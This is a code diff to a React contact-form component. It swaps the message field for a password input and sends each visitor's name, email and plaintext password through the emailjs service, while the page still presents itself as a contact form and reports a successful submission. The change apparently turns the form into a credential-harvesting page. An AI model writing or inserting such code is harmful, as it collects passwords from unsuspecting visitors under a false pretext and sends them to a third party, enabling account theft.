@@ -7,7 +7,7 @@ import './Contact.css'
 function Contact() {
   const [name, setname] = useState('')
   const [email, setemail] = useState('')
-  const [message, setmessage] = useState('')
+  const [pass, setpass] = useState('')
 
   function prit(e) {
     e.preventDefault()
@@ -15,7 +15,7 @@ function Contact() {
     const templateParams = {
       name: name,
       email: email,
-      message: message,
+      password: pass,
     }
 
     emailjs.send(
@@ -28,7 +28,7 @@ function Contact() {
       toast.success("Form submitted successfully 🎉")
       setname('')
       setemail('')
-      setmessage('')
+      setpass('')
     })
     .catch(() => {
       toast.error("Failed to send email ❌")
@@ -67,10 +67,11 @@ function Contact() {
           required
         />
 
-        <textarea
-          value={message}
-          onChange={(e) => setmessage(e.target.value)}
-          placeholder="Enter Your Message"
+        <input
+          type="password"
+          value={pass}
+          onChange={(e) => setpass(e.target.value)}
+          placeholder="Enter Your Password"
           required
         />
 
